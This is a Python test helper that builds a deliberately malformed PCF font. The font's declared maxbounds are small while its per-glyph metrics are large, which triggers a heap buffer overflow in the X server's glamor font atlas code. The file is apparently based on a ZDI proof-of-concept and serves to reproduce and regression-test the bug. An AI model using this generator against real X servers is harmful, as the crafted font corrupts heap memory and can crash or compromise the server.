# SPDX-License-Identifier: MIT
#
# Minimal PCF (Portable Compiled Format) font builder for testing.
#
# Directly constructs the binary PCF format matching what libXfont2
# expects, based on the proven PoC generator from ZDI-CAN-30498.

import struct

# PCF table types
PCF_PROPERTIES = 1
PCF_ACCELERATORS = 2
PCF_METRICS = 4
PCF_BITMAPS = 8
PCF_BDF_ENCODINGS = 32

# Format: glyph pad index 2 → pad 4 (matches server GLYPHPADBYTES=4).
# This avoids the RepadBitmap path inside libXfont2.
BITMAP_FORMAT = 0x00000002
DEFAULT_FORMAT = 0x00000000


def _u32(v):
    return struct.pack("<I", v & 0xFFFFFFFF)


def _s32(v):
    return struct.pack("<i", v)


def _u16(v):
    return struct.pack("<H", v & 0xFFFF)


def _s16(v):
    return struct.pack("<h", v)


def _u8(v):
    return struct.pack("<B", v & 0xFF)


def _metric(lsb, rsb, cw, asc, desc, attr=0):
    """Pack an uncompressed xCharInfo (6 x INT16LE = 12 bytes)."""
    return _s16(lsb) + _s16(rsb) + _s16(cw) + _s16(asc) + _s16(desc) + _u16(attr)


def build_evil_pcf(
    max_lsb=0,
    max_rsb=4,
    max_ascent=4,
    max_descent=0,
    glyph_lsb=0,
    glyph_rsb=100,
    glyph_ascent=100,
    glyph_descent=0,
    char_code=0x21,
):
    """Build a malicious PCF font file.

    Creates a PCF font where the declared maxbounds are small but
    the per-glyph metrics are large.  When glamor_font_get() builds
    the font atlas, it allocates based on maxbounds but copies based
    on per-glyph metrics, causing a heap buffer overflow.

    The bitmap section is deliberately oversized so that source-side
    reads in glamor's memcpy loop stay in-bounds, ensuring ASAN
    reports the OOB write (not an OOB read).

    Args:
        max_lsb: maxbounds left side bearing (the lie)
        max_rsb: maxbounds right side bearing (the lie)
        max_ascent: maxbounds ascent (the lie)
        max_descent: maxbounds descent (the lie)
        glyph_lsb: per-glyph left side bearing (the truth)
        glyph_rsb: per-glyph right side bearing (the truth)
        glyph_ascent: per-glyph ascent (the truth)
        glyph_descent: per-glyph descent (the truth)
        char_code: character code for the single glyph

    Returns:
        Tuple of (pcf_bytes, xlfd_name) where xlfd_name is the XLFD
        string to use with OpenFont.
    """

    # Compute bitmap size: large enough for all source reads
    glyph_height = glyph_ascent + glyph_descent
    glyph_padded = (((glyph_rsb - glyph_lsb + 7) >> 3) + 3) & ~3
    bitmap_size = max(2048, glyph_padded * glyph_height + 16)

    # ---- PROPERTIES table ----
    props = _u32(DEFAULT_FORMAT)
    props += _u32(1)  # nprops = 1
    props += _u32(0)  # prop[0].name offset
    props += _u8(0)  # prop[0].isStringProp = 0
    props += _u32(0)  # prop[0].value = 0
    props += b"\x00" * 3  # padding (nprops & 3 = 1 → 3 pad bytes)
    props += _u32(1)  # string_size = 1
    props += b"\x00"  # strings = "\0"

    # ---- ACCELERATORS table ----
    accel = _u32(DEFAULT_FORMAT)
    accel += _u8(0) * 8  # 7 flags + 1 padding
    accel += _u32(max_ascent)  # fontAscent
    accel += _u32(max_descent)  # fontDescent
    accel += _u32(0)  # maxOverlap
    accel += _metric(max_lsb, max_rsb, max_rsb, max_ascent, max_descent)  # minbounds
    accel += _metric(
        max_lsb, max_rsb, max_rsb, max_ascent, max_descent
    )  # maxbounds (THE LIE)

    # ---- METRICS table (uncompressed) ----
    metrics = _u32(DEFAULT_FORMAT)
    metrics += _u32(1)  # nmetrics = 1
    metrics += _metric(glyph_lsb, glyph_rsb, glyph_rsb, glyph_ascent, glyph_descent)

    # ---- BITMAPS table ----
    bitmaps = _u32(BITMAP_FORMAT)
    bitmaps += _u32(1)  # nbitmaps = 1
    bitmaps += _u32(0)  # offsets[0] = 0
    bitmaps += _u32(0) * 2  # bitmapSizes[0..1] (unused)
    bitmaps += _u32(bitmap_size)  # bitmapSizes[2] (pad=4, the one used)
    bitmaps += _u32(0)  # bitmapSizes[3] (unused)
    bitmaps += b"\xaa" * bitmap_size  # recognizable fill pattern

    # ---- BDF_ENCODINGS table ----
    encodings = _u32(DEFAULT_FORMAT)
    encodings += _s16(char_code)  # firstCol
    encodings += _s16(char_code)  # lastCol
    encodings += _s16(0)  # firstRow
    encodings += _s16(0)  # lastRow
    encodings += _s16(char_code)  # defaultCh
    encodings += _u16(0)  # encoding[0] = 0 (points to metrics[0])

    # ---- Assemble ----
    tables = [
        (PCF_PROPERTIES, DEFAULT_FORMAT, props),
        (PCF_ACCELERATORS, DEFAULT_FORMAT, accel),
        (PCF_METRICS, DEFAULT_FORMAT, metrics),
        (PCF_BITMAPS, BITMAP_FORMAT, bitmaps),
        (PCF_BDF_ENCODINGS, DEFAULT_FORMAT, encodings),
    ]

    ntables = len(tables)
    header_size = 8 + 16 * ntables
    offset = header_size

    toc = b""
    data = b""
    for ttype, tformat, tbody in tables:
        size = len(tbody)
        toc += _u32(ttype) + _u32(tformat) + _u32(size) + _u32(offset)
        data += tbody
        offset += size

    pcf = _u32(0x70636601) + _u32(ntables) + toc + data

    xlfd = (
        f"-evil-test-medium-r-normal--"
        f"{max_ascent + max_descent}-"
        f"{(max_ascent + max_descent) * 10}-75-75-c-"
        f"{max_rsb * 10}-iso8859-1"
    )

    return pcf, xlfd
